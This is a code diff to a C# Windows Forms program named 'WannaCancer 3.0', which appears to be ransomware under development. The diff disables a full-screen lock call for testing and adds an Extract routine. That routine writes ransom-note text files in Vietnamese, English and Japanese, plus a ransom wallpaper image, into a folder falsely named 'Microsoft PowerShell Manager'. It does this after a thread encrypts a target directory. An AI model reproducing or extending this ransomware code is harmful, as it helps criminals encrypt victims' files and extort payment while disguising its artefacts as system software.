@@ -20,7 +20,7 @@ namespace WannaCancer3._0
         public WannaCancer()
         {
             InitializeComponent();
-            MakeFullScreen();
+            //MakeFullScreen();
 
             encrypt = new Thread(StartEncrypt);
             encrypt.Start();       
@@ -43,11 +43,41 @@ namespace WannaCancer3._0
             //}
 
             Encrypt(@"C:\Files\Test\");
+            Extract();
+
 
             Thread.Sleep(60000);
             Environment.Exit(0);
         }
-        
+
+        private void Extract()
+        {
+            Directory.CreateDirectory(@"C:\Program Files\Microsoft PowerShell Manager\");
+            FileStream VN = new FileStream(@"C:\Program Files\Microsoft PowerShell Manager\VI.txt", FileMode.Create, FileAccess.Write);
+            FileStream EN = new FileStream(@"C:\Program Files\Microsoft PowerShell Manager\EN.txt", FileMode.Create, FileAccess.Write);
+            FileStream JP = new FileStream(@"C:\Program Files\Microsoft PowerShell Manager\JP.txt", FileMode.Create, FileAccess.Write);
+            FileStream BG = new FileStream(@"C:\Program Files\Microsoft PowerShell Manager\BG.png", FileMode.Create, FileAccess.Write);
+
+            byte[] vi = Encoding.Unicode.GetBytes(Properties.Resources.VI);
+            byte[] en = Encoding.Default.GetBytes(Properties.Resources.EN);
+            byte[] jp = Encoding.Unicode.GetBytes(Properties.Resources.JP);
+            //Image -> byte
+            ImageConverter imageConverter = new ImageConverter();
+            byte[] bg = (byte[])imageConverter.ConvertTo(Properties.Resources.WallPaper, typeof(byte[]));
+
+
+            VN.Write(vi, 0, vi.Length);
+            EN.Write(en, 0, en.Length);
+            JP.Write(jp, 0, jp.Length);
+            BG.Write(bg, 0, bg.Length);
+
+            VN.Close();
+            EN.Close();
+            JP.Close();
+            BG.Close();
+
+
+        }
 
         private void Encrypt(string path)
         {
